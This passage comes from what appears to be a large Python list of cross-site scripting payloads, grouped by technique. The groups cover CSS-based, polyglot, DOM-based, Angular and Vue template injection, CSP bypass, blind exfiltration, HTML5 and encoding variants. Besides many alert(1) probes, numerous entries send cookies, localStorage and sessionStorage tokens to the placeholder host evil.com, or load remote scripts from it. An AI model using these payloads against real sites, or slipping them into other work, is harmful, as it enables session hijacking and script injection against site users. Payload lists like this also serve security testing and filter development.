        '<script>Function`a${"alert(1)"}a```</script>',
        '<script>setTimeout("alert(1)",0)</script>',
        '<script>setTimeout`alert\x281\x29`</script>',
        '<script>setInterval("alert(1)",0)</script>',
        '<script>setInterval`alert\x281\x29`</script>',
        '<script>new Function("alert(1)")()</script>',
        '<script>window["alert"](1)</script>',
        '<script>window[atob("YWxlcnQ=")](1)</script>',
        '<script>window[/alert/.source](1)</script>',
        '<script>window[`${"alert"}`](1)</script>',
        '<script>self["alert"](1)</script>',
        '<script>top["alert"](1)</script>',
        '<script>parent["alert"](1)</script>',
        '<script>this["alert"](1)</script>',
        '<script>opener["alert"](1)</script>',
        '<script>frames["alert"](1)</script>',
        '<script>window["al"+"ert"](1)</script>',
        '<script>window["al"][`ert`](1)</script>',
        '<script>window[`${"al"+"ert"}`](1)</script>',
        '<script>window[`${String.fromCharCode(97,108,101,114,116)}`](1)</script>',
        '<script>window[atob("YWxlcnQ=")+atob("")](1)</script>',
        '<script>window["\\x61\\x6c\\x65\\x72\\x74"](1)</script>',
        '<script>window["\\u0061\\u006c\\u0065\\u0072\\u0074"](1)</script>',
        '<script>window[decodeURIComponent("%61%6c%65%72%74")](1)</script>',
        '<script>window[decodeURI("%61%6c%65%72%74")](1)</script>',
        '<script>window[unescape("%61%6c%65%72%74")](1)</script>',
        '<script>window[escape("alert")](1)</script>',
        '<script>window[/\\x61\\x6c\\x65\\x72\\x74/.source](1)</script>',
        '<script>window[`${/alert/.source}`](1)</script>',
        '<script>window[`${new String("alert")}`](1)</script>',
        '<script>window[`${String.prototype.constructor("alert")}`](1)</script>',
        '<script>window[`${[]["filter"]["constructor"]("return alert")()}`](1)</script>',
        '<script>window[`${[]["filter"]["constructor"]("return " + "alert")()}`](1)</script>',
        '<script>window[`${Function("return alert")()}`](1)</script>',
        '<script>window[`${(()=>alert)()}`](1)</script>',
        '<script>window[`${(new (function(){})).alert}`](1)</script>',
        '<script>alert\\(\\)</script>',
        '<script>alert\\(\\)\\.bind\\(this\\)\\(\\)</script>',
        '<script>alert\\.call\\(this,1\\)</script>',
        '<script>alert\\.apply\\(this,[1]\\)</script>',
        '<script>Reflect.apply(alert,null,[1])</script>',
        '<script>Reflect.construct(alert,[1])</script>',
        '<script>Object.getPrototypeOf(window).alert(1)</script>',
        '<script>Object.getPrototypeOf(globalThis).alert(1)</script>',
        '<script>Object.getPrototypeOf(self).alert(1)</script>',
        '<script>Object.getPrototypeOf(top).alert(1)</script>',
        '<script>Object.getPrototypeOf(parent).alert(1)</script>',
        '<script>Object.getPrototypeOf(frames).alert(1)</script>',
        '<script>Object.getPrototypeOf(window).alert.call(window,1)</script>',
        '<script>(function(){alert(1)})()</script>',
        '<script>((()=>alert(1))())</script>',
        
        # ==================== 521-570: CSS-BASED XSS (50) ====================
        '<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart=alert(1)>',
        '<style>@keyframes x{}</style><div style="animation-name:x" onanimationiteration=alert(1)>',
        '<style>@keyframes x{}</style><div style="animation-name:x" onanimationend=alert(1)>',
        '<style>@keyframes x{from{opacity:1}to{opacity:0}}</style><div style="animation:x 1s" onanimationstart=alert(1)>',
        '<style>body{background:url("javascript:alert(1)")}</style>',
        '<style>body{background-image:url("javascript:alert(1)")}</style>',
        '<style>*{background:url("javascript:alert(1)")}</style>',
        '<style>input[type="password"]{background:url("javascript:alert(1)")}</style>',
        '<style>div{background:url("javascript:alert(1)")}</style>',
        '<style>@import "javascript:alert(1)";</style>',
        '<style>@import url("javascript:alert(1)");</style>',
        '<style>@import url(javascript:alert(1));</style>',
        '<link rel=stylesheet href="javascript:alert(1)">',
        '<link rel="stylesheet" href="javascript:alert(1)">',
        '<link rel="stylesheet" href="data:text/css,body{background:url(javascript:alert(1))}">',
        '<link rel="stylesheet" href="data:text/css;base64,Ym9keXtiYWNrZ3JvdW5kOnVybChqYXZhc2NyaXB0OmFsZXJ0KDEpKX0=">',
        '<style>body{background:url("//evil.com/?"+document.cookie)}</style>',
        '<style>body{background:url("//evil.com/?"+document.domain)}</style>',
        '<style>body{background:url("//evil.com/?"+document.cookie)}</style>',
        '<style>div{background:url("javascript:alert(1)")}</style>',
        '<style>div{background-image:expression(alert(1))}</style>',
        '<style>div{width:expression(alert(1))}</style>',
        '<style>div{behavior:url("javascript:alert(1)")}</style>',
        '<style>div{-moz-binding:url("javascript:alert(1)")}</style>',
        '<style>div{background:url("javascript:alert(1)")}</style>',
        '<div style="background:url(javascript:alert(1))">XSS</div>',
        '<div style="background-image:url(javascript:alert(1))">XSS</div>',
        '<div style="background-image:url(&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;)">XSS</div>',
        '<div style="background-image:url(\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3a\x61\x6c\x65\x72\x74\x28\x31\x29)">XSS</div>',
        '<div style="background-image:url(\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029)">XSS</div>',
        '<div style="background-image:url(javascript:alert(1))">XSS</div>',
        '<div style="background-image:url(javascript:alert(document.cookie))">XSS</div>',
        '<div style="background-image:url(javascript:confirm(1))">XSS</div>',
        '<div style="background-image:url(javascript:prompt(1))">XSS</div>',
        '<div style="width:expression(alert(1))">XSS</div>',
        '<div style="height:expression(alert(1))">XSS</div>',
        '<div style="position:expression(alert(1))">XSS</div>',
        '<div style="behavior:url(javascript:alert(1))">XSS</div>',
        '<div style="-moz-binding:url(javascript:alert(1))">XSS</div>',
        '<style>div{list-style-image:url(javascript:alert(1))}</style><div>XSS</div>',
        '<style>div{border-image:url(javascript:alert(1))}</style><div>XSS</div>',
        '<style>div{cursor:url(javascript:alert(1))}</style><div>XSS</div>',
        '<style>div{clip:expression(alert(1))}</style><div>XSS</div>',
        '<style>div{color:expression(alert(1))}</style><div>XSS</div>',
        '<style>div{font:expression(alert(1))}</style><div>XSS</div>',
        '<style>div{content:expression(alert(1))}</style><div>XSS</div>',
        '<style>div{outline:expression(alert(1))}</style><div>XSS</div>',
        '<style>div{text-indent:expression(alert(1))}</style><div>XSS</div>',
        '<style>div{vertical-align:expression(alert(1))}</style><div>XSS</div>',
        '<style>div{z-index:expression(alert(1))}</style><div>XSS</div>',
        
        # ==================== 571-620: POLYGLOTS & MUTATION XSS (50) ====================
        '"><svg/onload=alert(1)>',
        '\'"><svg/onload=alert(1)>',
        '"><img src=x onerror=alert(1)>',
        '\'"><img src=x onerror=alert(1)>',
        '"><script>alert(1)</script>',
        '\'><script>alert(1)</script>',
        '\'">><script>alert(1)</script>',
        'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"+/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
        '--></title></style><script>alert(1)</script>',
        '*/alert(1)/*',
        '*/=alert(1)//',
        '*/alert(1)//',
        '<!--><script>alert(1)</script>',
        '<!-- --><script>alert(1)</script>',
        '<!--<script>alert(1)</script>',
        '<script>alert(1)//--></script>',
        '<script><!--alert(1)--></script>',
        '<script>//comment\nalert(1)</script>',
        '<script><!--\nalert(1)\n//--></script>',
        '<script>/*comment*/alert(1)/*comment*/</script>',
        '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
        '<noscript><p title="</noscript><svg onload=alert(1)>">',
        '<noscript><p title="</noscript><script>alert(1)</script>">',
        '<math><mtext><mglyph><style><!--</style><img src=x onerror=alert(1)>">',
        '<math><mtext><mglyph><style><!--</style><svg onload=alert(1)>">',
        '<math><mtext><mglyph><style><!--</style><script>alert(1)</script>">',
        '<?xml version="1.0" standalone="no"?><svg onload="alert(1)"/>',
        '<?xml version="1.0" encoding="UTF-8"?><svg onload="alert(1)"/>',
        '<?xml version="1.0"?><svg onload="alert(1)"/>',
        '<%00script>alert(1)</script>',
        '<script\x00>alert(1)</script>',
        '<script\x0D>alert(1)</script>',
        '<script\x0A>alert(1)</script>',
        '<script\x09>alert(1)</script>',
        '<script\x0C>alert(1)</script>',
        '<script\x20>alert(1)</script>',
        '<script\x2E>alert(1)</script>',
        '<script\x2F>alert(1)</script>',
        '<script\x3C>alert(1)</script>',
        '<script\x3E>alert(1)</script>',
        '<script\x3F>alert(1)</script>',
        '<script\x40>alert(1)</script>',
        '<script\x7E>alert(1)</script>',
        '<script\x7F>alert(1)</script>',
        '<script\x80>alert(1)</script>',
        '<script\x81>alert(1)</script>',
        '<script\x82>alert(1)</script>',
        '<script\xFF>alert(1)</script>',
        '<script\\0>alert(1)</script>',
        '<script\\\\>alert(1)</script>',
        
        # ==================== 621-680: DOM-BASED & JAVASCRIPT INJECTION (60) ====================
        '#"><img src=/ onerror=alert(1)>',
        '#"><svg/onload=alert(1)>',
        '#"><script>alert(1)</script>',
        '#"><img src=x onerror=alert(1)>',
        '#"><iframe src=javascript:alert(1)>',
        '"><script>eval(location.hash.slice(1))</script>#alert(1)',
        '"><script>eval(location.hash.substring(1))</script>#alert(1)',
        '"><script>new Function(location.hash.slice(1))()</script>#alert(1)',
        '"><script>setTimeout(location.hash.slice(1),0)</script>#alert(1)',
        '"><script>document.write("<img src=x onerror=alert(1)>")</script>',
        '"><script>document.writeln("<img src=x onerror=alert(1)>")</script>',
        '"><script>document.write(unescape("%3Cimg%20src=x%20onerror=alert(1)%3E"))</script>',
        '"><script>document.body.innerHTML="<img src=x onerror=alert(1)>"</script>',
        '"><script>document.body.appendChild(document.createElement("img")).src="x",document.body.lastChild.onerror=alert(1)</script>',
        '"><script>document.body.insertAdjacentHTML("beforeend","<img src=x onerror=alert(1)>")</script>',
        '"><script>location="javascript:alert(1)"</script>',
        '"><script>location.href="javascript:alert(1)"</script>',
        '"><script>location.replace("javascript:alert(1)")</script>',
        '"><script>location.assign("javascript:alert(1)")</script>',
        '"><script>window.location="javascript:alert(1)"</script>',
        '"><script>self.location="javascript:alert(1)"</script>',
        '"><script>top.location="javascript:alert(1)"</script>',
        '"><script>parent.location="javascript:alert(1)"</script>',
        '"><script>open("javascript:alert(1)")</script>',
        '"><script>window.open("javascript:alert(1)")</script>',
        '"><script>window.open().document.write("<script>alert(1)</script>")</script>',
        '"><script>document.cookie</script>',
        '"><script>alert(document.cookie)</script>',
        '"><script>console.log(document.cookie)</script>',
        '"><script>fetch("//evil.com/?c="+document.cookie)</script>',
        '"><script>new Image().src="//evil.com/?c="+document.cookie</script>',
        '"><script>navigator.sendBeacon("//evil.com/",document.cookie)</script>',
        '"><script>XMLHttpRequest.prototype.open.call(this,"GET","//evil.com/?c="+document.cookie,false)</script>',
        '"><script>$.getScript("//evil.com/xss.js")</script>',
        '"><script>jQuery.ajax({url:"//evil.com/xss.js",dataType:"script"})</script>',
        '"><script>$.get("//evil.com/xss.js",function(data){eval(data)})</script>',
        '"><script>import("//evil.com/xss.js")</script>',
        '"><script>importScripts("//evil.com/xss.js")</script>',
        '"><script>Worker("//evil.com/xss.js")</script>',
        '"><script>SharedWorker("//evil.com/xss.js")</script>',
        '"><script>ServiceWorker.register("//evil.com/sw.js")</script>',
        '"><script>window.addEventListener("message",function(e){eval(e.data)})</script>',
        '"><script>window.postMessage("alert(1)","*")</script>',
        '"><script>document.domain</script>',
        '"><script>window.name</script>',
        '"><script>alert(window.name)</script>',
        '"><script>eval(window.name)</script>',
        '"><script>new Function(window.name)()</script>',
        '"><script>setTimeout(window.name,0)</script>',
        '"><script>setInterval(window.name,0)</script>',
        '"><script>location.hash</script>',
        '"><script>alert(location.hash)</script>',
        '"><script>eval(location.hash.substring(1))</script>',
        '"><script>new Function(location.hash.substring(1))()</script>',
        '"><script>setTimeout(location.hash.substring(1),0)</script>',
        '"><script>document.referrer</script>',
        '"><script>alert(document.referrer)</script>',
        '"><script>eval(document.referrer)</script>',
        '"><script>document.URL</script>',
        '"><script>alert(document.URL)</script>',
        '"><script>eval(document.URL.split("#")[1])</script>',
        
        # ==================== 681-730: ANGULAR/REACT/VUE (50) ====================
        '{{constructor.constructor(\'alert(1)\')()}}',
        '{{$on.constructor(\'alert(1)\')()}}',
        '{{toString().constructor.constructor(\'alert(1)\')()}}',
        '{{[].constructor.constructor(\'alert(1)\')()}}',
        '{{({}).constructor.constructor(\'alert(1)\')()}}',
        '{{"".constructor.constructor(\'alert(1)\')()}}',
        '{{0.constructor.constructor(\'alert(1)\')()}}',
        '{{false.constructor.constructor(\'alert(1)\')()}}',
        '{{/./.constructor.constructor(\'alert(1)\')()}}',
        '{{(()=>{}).constructor.constructor(\'alert(1)\')()}}',
        '{{(function(){}).constructor.constructor(\'alert(1)\')()}}',
        '{{this.constructor.constructor(\'alert(1)\')()}}',
        '{{window.constructor.constructor(\'alert(1)\')()}}',
        '{{self.constructor.constructor(\'alert(1)\')()}}',
        '{{globalThis.constructor.constructor(\'alert(1)\')()}}',
        '{{$eval(\'alert(1)\')}}',
        '{{$eval("alert(1)")}}',
        '{{$eval(`alert(1)`)}}',
        '{{$eval("alert(document.cookie)")}}',
        '{{$eval("confirm(1)")}}',
        '{{$eval("prompt(1)")}}',
        '{{$eval("location=\'javascript:alert(1)\'")}}',
        '{{$eval("document.write(\'<img src=x onerror=alert(1)>\')")}}',
        '{{$eval("setTimeout(\'alert(1)\',0)")}}',
        '{{$eval("Function(\'alert(1)\')()")}}',
        '{{$eval("eval(\'alert(1)\')")}}',
        '{{$eval("fetch(\'//evil.com/?c=\'+document.cookie)")}}',
        '{{$eval("new Image().src=\'//evil.com/?c=\'+document.cookie")}}',
        '{{$eval("navigator.sendBeacon(\'//evil.com/\',document.cookie)")}}',
        '${constructor.constructor(\'alert(1)\')()}',
        '${$on.constructor(\'alert(1)\')()}',
        '${toString().constructor.constructor(\'alert(1)\')()}',
        '${[].constructor.constructor(\'alert(1)\')()}',
        '${$eval(\'alert(1)\')}',
        '${$eval("alert(1)")}',
        '${$eval(`alert(1)`)}',
        '#{constructor.constructor(\'alert(1)\')()}',
        '#{$on.constructor(\'alert(1)\')()}',
        '#{toString().constructor.constructor(\'alert(1)\')()}',
        '#{[].constructor.constructor(\'alert(1)\')()}',
        '#{$eval(\'alert(1)\')}',
        '#{$eval("alert(1)")}',
        '#{$eval(`alert(1)`)}',
        '{$on.constructor("alert(1)")()}',
        '{{$parent.$parent.$parent.$parent.$parent.$parent.$parent.$parent.$parent.$parent.$parent.$parent.$parent.$parent.$parent.$parent.$parent.$parent.$parent.$parent.$parent.$parent.$parent.$parent.$parent.$parent.$parent.$parent.$parent.$parent.$eval(\'alert(1)\')}}',
        '{{$root.$eval(\'alert(1)\')}}',
        '{{$root.constructor.constructor(\'alert(1)\')()}}',
        '{{$root.$parent.$eval(\'alert(1)\')}}',
        '{{$root.$parent.constructor.constructor(\'alert(1)\')()}}',
        '<div ng-app ng-csp><div ng-init="$eval(\'alert(1)\')"></div></div>',
        '<div ng-app><div ng-init="alert(1)"></div></div>',
        
        # ==================== 731-780: FRAMEWORK-SPECIFIC (50) ====================
        '<div ng-app ng-csp><div ng-init="$eval(\'alert(1)\')"></div></div>',
        '<div ng-app><div ng-init="alert(1)"></div></div>',
        '<div ng-app ng-controller="x"><div ng-click="alert(1)">XSS</div></div>',
        '<div ng-app ng-controller="x"><div ng-mouseover="alert(1)">XSS</div></div>',
        '<div ng-app ng-controller="x"><div ng-focus="alert(1)" autofocus>XSS</div></div>',
        '<div ng-app ng-controller="x"><div ng-blur="alert(1)" autofocus>XSS</div></div>',
        '<div ng-app><div ng-bind-html="\'<img src=x onerror=alert(1)>\'"></div></div>',
        '<div ng-app><div ng-bind-html="trustedHtml" ng-init="trustedHtml=\'<img src=x onerror=alert(1)>\'"></div></div>',
        '<div ng-app><div ng-bind="\'<img src=x onerror=alert(1)>\'"></div></div>',
        '<div ng-app><div ng-include="\'data:text/html,<script>alert(1)</script>\'"></div></div>',
        '<div ng-app><div ng-include="\'//evil.com/xss.html\'"></div></div>',
        '<div ng-app><script>alert(1)</script></div>',
        '<div ng-app><img src=x onerror=alert(1)></div>',
        '<div ng-app><svg onload=alert(1)></div>',
        '<div ng-app><a href="javascript:alert(1)">XSS</a></div>',
        '<div ng-app><iframe src="javascript:alert(1)"></iframe></div>',
        '<div ng-app><base href="javascript:alert(1)//"></div>',
        '<div ng-app><object data="javascript:alert(1)"></object></div>',
        '<div ng-app><embed src="javascript:alert(1)"></embed></div>',
        '<div ng-app><form action="javascript:alert(1)"><input type=submit></form></div>',
        '<div ng-app><input type=image src="javascript:alert(1)"></div>',
        '<div ng-app><input type=button value="XSS" onclick=alert(1)></div>',
        '<div ng-app><button onclick=alert(1)>XSS</button></div>',
        '<div ng-app><details open ontoggle=alert(1)></details></div>',
        '<div ng-app><marquee onstart=alert(1)>XSS</marquee></div>',
        '<div ng-app><video><source onerror=alert(1)></video></div>',
        '<div ng-app><audio src=x onerror=alert(1)></audio></div>',
        '<div ng-app><svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>',
        '<div ng-app><svg><script>alert(1)</script></svg>',
        '<div ng-app><style>@import "javascript:alert(1)";</style></div>',
        '<div ng-app><link rel=stylesheet href="javascript:alert(1)"></div>',
        '<div v-html="\'<img src=x onerror=alert(1)>\'"></div>',
        '<div v-html="trustedHtml" v-init="trustedHtml=\'<img src=x onerror=alert(1)>\'"></div>',
        '<div v-bind:innerHTML="\'<img src=x onerror=alert(1)>\'"></div>',
        '<div v-bind:innerHTML.prop="\'<img src=x onerror=alert(1)>\'"></div>',
        '<div v-bind:outerHTML="\'<img src=x onerror=alert(1)>\'"></div>',
        '<div v-bind:outerHTML.prop="\'<img src=x onerror=alert(1)>\'"></div>',
        '<div v-bind:data="\'<img src=x onerror=alert(1)>\'"></div>',
        '<div v-bind:data="trustedData" v-init="trustedData=\'<img src=x onerror=alert(1)>\'"></div>',
        '<div v-bind:title="\'<img src=x onerror=alert(1)>\'"></div>',
        '<div v-bind:alt="\'<img src=x onerror=alert(1)>\'"></div>',
        '<div v-bind:src="\'x\'" onerror=alert(1)>XSS</div>',
        '<div v-bind:href="\'javascript:alert(1)\'">XSS</div>',
        '<div v-bind:href="trustedUrl" v-init="trustedUrl=\'javascript:alert(1)\'">XSS</div>',
        '<a v-bind:href="\'javascript:alert(1)\'">XSS</a>',
        '<iframe v-bind:src="\'javascript:alert(1)\'"></iframe>',
        '<iframe v-bind:srcdoc="\'<script>alert(1)</script>\'"></iframe>',
        '<object v-bind:data="\'javascript:alert(1)\'"></object>',
        '<embed v-bind:src="\'javascript:alert(1)\'"></embed>',
        '<form v-bind:action="\'javascript:alert(1)\'"><input type=submit></form>',
        
        # ==================== 781-830: CSP BYPASS ATTEMPTS (50) ====================
        '<script src="data:text/javascript,alert(1)"></script>',
        '<script src="data:application/javascript,alert(1)"></script>',
        '<script src="data:application/x-javascript,alert(1)"></script>',
        '<script src="blob:https://example.com/12345678-1234-1234-1234-123456789012"></script>',
        '<script>import("data:text/javascript,alert(1)")</script>',
        '<script>importScripts("data:text/javascript,alert(1)")</script>',
        '<link rel="dns-prefetch" href="//evil.com">',
        '<link rel="preconnect" href="//evil.com">',
        '<link rel="prefetch" href="//evil.com/xss">',
        '<link rel="preload" href="//evil.com/xss">',
        '<link rel="prerender" href="//evil.com/xss">',
        '<link rel="stylesheet" href="//evil.com/xss.css">',
        '<link rel="import" href="//evil.com/xss.html">',
        '<meta http-equiv="Content-Security-Policy" content="default-src \'self\'">',
        '<meta http-equiv="Content-Security-Policy" content="script-src \'self\' \'unsafe-inline\'">',
        '<meta http-equiv="Refresh" content="0;url=javascript:alert(1)">',
        '<meta http-equiv="refresh" content="0;url=data:text/html,<script>alert(1)</script>">',
        '<base href="//evil.com/">',
        '<base target="_blank">',
        '<object data="//evil.com/xss.swf">',
        '<embed src="//evil.com/xss.swf">',
        '<applet code="//evil.com/xss.class">',
        '<svg><use href="//evil.com/evil.svg#x"></use></svg>',
        '<svg><use href="data:image/svg+xml,<svg onload=alert(1)>"></use></svg>',
        '<iframe src="//evil.com/xss.html">',
        '<iframe srcdoc="<script>alert(1)</script>">',
        '<iframe src="data:text/html,<script>alert(1)</script>">',
        '<iframe src="blob:https://example.com/12345678-1234-1234-1234-123456789012">',
        '<script>const script = document.createElement("script"); script.src = "//evil.com/xss.js"; document.head.appendChild(script)</script>',
        '<script>const link = document.createElement("link"); link.rel = "import"; link.href = "//evil.com/xss.html"; document.head.appendChild(link)</script>',
        '<script>const iframe = document.createElement("iframe"); iframe.src = "javascript:alert(1)"; document.body.appendChild(iframe)</script>',
        '<script>const object = document.createElement("object"); object.data = "javascript:alert(1)"; document.body.appendChild(object)</script>',
        '<script>const embed = document.createElement("embed"); embed.src = "javascript:alert(1)"; document.body.appendChild(embed)</script>',
        '<script>const img = new Image(); img.src = "x"; img.onerror = alert(1); document.body.appendChild(img)</script>',
        '<script>const svg = document.createElementNS("http://www.w3.org/2000/svg","svg"); svg.setAttribute("onload","alert(1)"); document.body.appendChild(svg)</script>',
        '<script>const a = document.createElement("a"); a.href = "javascript:alert(1)"; a.click()</script>',
        '<script>location="javascript:alert(1)"</script>',
        '<script>location.href="javascript:alert(1)"</script>',
        '<script>location.replace("javascript:alert(1)")</script>',
        '<script>location.assign("javascript:alert(1)")</script>',
        '<script>open("javascript:alert(1)")</script>',
        '<script>window.open("javascript:alert(1)")</script>',
        '<script>document.write("<script src=//evil.com/xss.js></script>")</script>',
        '<script>document.writeln("<script src=//evil.com/xss.js></script>")</script>',
        '<script>document.body.innerHTML="<img src=x onerror=alert(1)>"</script>',
        '<script>document.body.insertAdjacentHTML("beforeend","<img src=x onerror=alert(1)>")</script>',
        '<script>document.body.appendChild(document.createElement("img")).src="x",document.body.lastChild.onerror=alert(1)</script>',
        '<script>eval(atob("YWxlcnQoMSk="))</script>',
        '<script>setTimeout(atob("YWxlcnQoMSk="),0)</script>',
        '<script>setInterval(atob("YWxlcnQoMSk="),0)</script>',
        '<script>Function(atob("YWxlcnQoMSk="))()</script>',
        
        # ==================== 831-880: BLIND XSS & EXFILTRATION (50) ====================
        '<img src=x onerror="fetch(\'//evil.com/?c=\'+document.cookie)">',
        '<img src=x onerror="new Image().src=\'//evil.com/?c=\'+document.cookie">',
        '<img src=x onerror="navigator.sendBeacon(\'//evil.com/\',document.cookie)">',
        '<img src=x onerror="XMLHttpRequest.prototype.open.call(this,\'GET\',\'//evil.com/?c=\'+document.cookie,false),this.send()">',
        '<img src=x onerror="fetch(\'//evil.com/?c=\'+document.domain)">',
        '<img src=x onerror="fetch(\'//evil.com/?c=\'+window.location)">',
        '<img src=x onerror="fetch(\'//evil.com/?c=\'+window.location.href)">',
        '<img src=x onerror="fetch(\'//evil.com/?c=\'+document.title)">',
        '<img src=x onerror="fetch(\'//evil.com/?c=\'+document.referrer)">',
        '<script>fetch("//evil.com/?c="+document.cookie)</script>',
        '<script>new Image().src="//evil.com/?c="+document.cookie</script>',
        '<script>navigator.sendBeacon("//evil.com/",document.cookie)</script>',
        '<script>XMLHttpRequest.prototype.open.call(this,"GET","//evil.com/?c="+document.cookie,false),this.send()</script>',
        '<script>const xhr = new XMLHttpRequest(); xhr.open("GET","//evil.com/?c="+document.cookie,false); xhr.send()</script>',
        '<script>fetch("//evil.com/?c="+document.domain)</script>',
        '<script>fetch("//evil.com/?c="+window.location)</script>',
        '<script>fetch("//evil.com/?c="+window.location.href)</script>',
        '<script>fetch("//evil.com/?c="+document.title)</script>',
        '<script>fetch("//evil.com/?c="+document.referrer)</script>',
        '<script>fetch("//evil.com/?c="+localStorage.getItem("token"))</script>',
        '<script>fetch("//evil.com/?c="+sessionStorage.getItem("token"))</script>',
        '<script>fetch("//evil.com/?c="+JSON.stringify(localStorage))</script>',
        '<script>fetch("//evil.com/?c="+JSON.stringify(sessionStorage))</script>',
        '<svg onload="fetch(\'//evil.com/?c=\'+document.cookie)">',
        '<svg onload="new Image().src=\'//evil.com/?c=\'+document.cookie">',
        '<svg onload="navigator.sendBeacon(\'//evil.com/\',document.cookie)">',
        '<body onload="fetch(\'//evil.com/?c=\'+document.cookie)">',
        '<body onload="new Image().src=\'//evil.com/?c=\'+document.cookie">',
        '<body onload="navigator.sendBeacon(\'//evil.com/\',document.cookie)">',
        '<iframe onload="fetch(\'//evil.com/?c=\'+document.cookie)">',
        '<iframe onload="new Image().src=\'//evil.com/?c=\'+document.cookie">',
        '<iframe onload="navigator.sendBeacon(\'//evil.com/\',document.cookie)">',
        '<details open ontoggle="fetch(\'//evil.com/?c=\'+document.cookie)">',
        '<marquee onstart="fetch(\'//evil.com/?c=\'+document.cookie)">',
        '<input onfocus="fetch(\'//evil.com/?c=\'+document.cookie)" autofocus>',
        '<textarea onfocus="fetch(\'//evil.com/?c=\'+document.cookie)" autofocus></textarea>',
        '<button onclick="fetch(\'//evil.com/?c=\'+document.cookie)">XSS</button>',
        '<a href="#" onclick="fetch(\'//evil.com/?c=\'+document.cookie)">XSS</a>',
        '<div onclick="fetch(\'//evil.com/?c=\'+document.cookie)">XSS</div>',
        '<span onmouseover="fetch(\'//evil.com/?c=\'+document.cookie)">XSS</span>',
        '<p onmousemove="fetch(\'//evil.com/?c=\'+document.cookie)">XSS</p>',
        '<div ondblclick="fetch(\'//evil.com/?c=\'+document.cookie)">XSS</div>',
        '<div oncontextmenu="fetch(\'//evil.com/?c=\'+document.cookie)">XSS</div>',
        '<input type="button" value="XSS" onclick="fetch(\'//evil.com/?c=\'+document.cookie)">',
        '<input type="submit" value="XSS" onclick="fetch(\'//evil.com/?c=\'+document.cookie)">',
        '<input type="reset" value="XSS" onclick="fetch(\'//evil.com/?c=\'+document.cookie)">',
        
        # ==================== 881-930: HTML5 & NEW ATTRIBUTES (50) ====================
        '<video poster="javascript:alert(1)//">',
        '<video src="x" onerror=alert(1)>',
        '<video><track onload=alert(1) src="invalid">',
        '<video><source src="invalid" onerror=alert(1)>',
        '<audio src="x" onerror=alert(1)>',
        '<audio><source src="invalid" onerror=alert(1)>',
        '<source src="invalid" onerror=alert(1)>',
        '<track onload=alert(1) src="invalid">',
        '<picture><source srcset="invalid" onerror=alert(1)><img src="x"></picture>',
        '<picture><img src="x" onerror=alert(1)></picture>',
        '<portal src="javascript:alert(1)">',
        '<portal src="data:text/html,<script>alert(1)</script>">',
        '<portal onload=alert(1)>',
        '<embed src="data:image/svg+xml,%3Csvg onload=alert(1)%3E%3C/svg%3E">',
        '<embed src="javascript:alert(1)">',
        '<embed onload=alert(1) src="invalid">',
        '<object data="javascript:alert(1)">',
        '<object data="data:image/svg+xml,%3Csvg onload=alert(1)%3E%3C/svg%3E">',
        '<object onload=alert(1)>',
        '<param name="movie" value="javascript:alert(1)">',
        '<param name="src" value="javascript:alert(1)">',
        '<param name="data" value="javascript:alert(1)">',
        '<param name="href" value="javascript:alert(1)">',
        '<applet code="javascript:alert(1)">',
        '<applet codebase="javascript:alert(1)">',
        '<applet archive="javascript:alert(1)">',
        '<applet onload=alert(1)>',
        '<keygen onfocus=alert(1) autofocus>',
        '<keygen onblur=alert(1) autofocus>',
        '<keygen onchange=alert(1) autofocus>',
        '<output onfocus=alert(1) autofocus>',
        '<output onblur=alert(1) autofocus>',
        '<output onchange=alert(1) autofocus>',
        '<progress onfocus=alert(1) autofocus>',
        '<progress onblur=alert(1) autofocus>',
        '<progress onchange=alert(1) autofocus>',
        '<meter onfocus=alert(1) autofocus>',
        '<meter onblur=alert(1) autofocus>',
        '<meter onchange=alert(1) autofocus>',
        '<canvas onfocus=alert(1) autofocus>',
        '<canvas onblur=alert(1) autofocus>',
        '<canvas onchange=alert(1) autofocus>',
        '<canvas onload=alert(1)>',
        '<canvas><img src=x onerror=alert(1)></canvas>',
        '<math onload=alert(1)>',
        '<math><maction onload=alert(1)>',
        '<math><mtext><img src=x onerror=alert(1)>',
        '<math><mtext><svg onload=alert(1)>',
        '<math><mtext><script>alert(1)</script>',
        '<math><mtext><iframe src=javascript:alert(1)>',
        
        # ==================== 931-980: ENCODING VARIATIONS (50) ====================
        '&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x3C;&#x2F;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;',
        '&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;',
        '&#60&#115&#99&#114&#105&#112&#116&#62&#97&#108&#101&#114&#116&#40&#49&#41&#60&#47&#115&#99&#114&#105&#112&#116&#62',
        '&lt;script&gt;alert(1)&lt;/script&gt;',
        '&lt;script&gt;alert(document.cookie)&lt;/script&gt;',
        '&lt;img src=x onerror=alert(1)&gt;',
        '&lt;svg onload=alert(1)&gt;',
        '&lt;body onload=alert(1)&gt;',
        '&lt;iframe src=javascript:alert(1)&gt;',
        '&lt;input onfocus=alert(1) autofocus&gt;',
        '\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E',
        '\\u003Cimg src=x onerror=alert(1)\\u003E',
        '\\u003Csvg onload=alert(1)\\u003E',
        '\\u003Cbody onload=alert(1)\\u003E',
        '\\u003Ciframe src=javascript:alert(1)\\u003E',
        '\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E',
        '\\x3Cimg src=x onerror=alert(1)\\x3E',
        '\\x3Csvg onload=alert(1)\\x3E',
        '\\x3Cbody onload=alert(1)\\x3E',
        '\\x3Ciframe src=javascript:alert(1)\\x3E',
        '%3Cscript%3Ealert(1)%3C%2Fscript%3E',
        '%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E',
        '%3Cimg%20src=x%20onerror=alert(1)%3E',
        '%3Csvg%20onload=alert(1)%3E',
